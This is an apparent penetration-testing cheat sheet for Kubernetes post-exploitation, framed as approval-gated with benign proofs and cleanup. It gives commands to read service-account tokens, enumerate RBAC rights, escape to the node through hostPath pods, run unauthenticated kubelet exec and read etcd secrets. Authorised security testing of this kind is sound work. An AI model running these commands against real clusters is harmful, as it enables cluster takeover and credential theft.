# Kubernetes attack reference
# Post-ex, approval-gated. Benign proof (can-i + one read/list). No workload disruption. Redact tokens. Cleanup.

## From inside a pod
```
# Service account token + CA:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default.svc
kubectl --token=$TOKEN auth can-i --list                 # THE key enum: what can this SA do?
# dangerous positives: create pods, pods/exec, get/list secrets, create clusterrolebindings, * on *
```

## RBAC privesc paths (benign proof = can-i + one action, then clean up)
```
# can-i create pods  -> create a pod that mounts the host fs / hostPID, read a node marker, DELETE the pod:
#   (pod spec: volumes hostPath / : /host ; command reads /host/etc/hostname)  -> then kubectl delete pod
# can-i get secrets  -> read ONE benign configmap/secret name (don't dump all)
# can-i create clusterrolebindings / escalate / bind  -> privesc to cluster-admin (demonstrate can-i, don't persist)
# can-i create pods/exec  -> exec into an existing pod
```

## Exposed components (unauth)
```
# Kubelet read/write API :10250 :
kubeletctl -i --server <node> pods ; kubeletctl -i --server <node> exec "id" -p <pod> -c <container>
# API server anonymous:  curl -k https://<api>:6443/api/v1/namespaces/default/pods   (anonymous-auth=true)
# etcd :2379 (no auth) -> read all secrets ; Dashboard with skip-login ; cAdvisor :4194
# kube-hunter --remote <ip>   (recon)
```

## Pod → node → cluster
A privileged / hostPID / hostPath pod = node root. From the node, read kubelet creds / other pod secrets
(demonstrate reach, don't harvest). Tools: `peirates`, `kube-hunter`, `kubeletctl`, `kdigger`.

## Safety
Benign: `can-i` + ONE read/list (or a single host marker for node reach). Delete any test pod. Never disrupt
workloads, never dump all secrets, never touch out-of-scope namespaces. Redact tokens to a fingerprint.
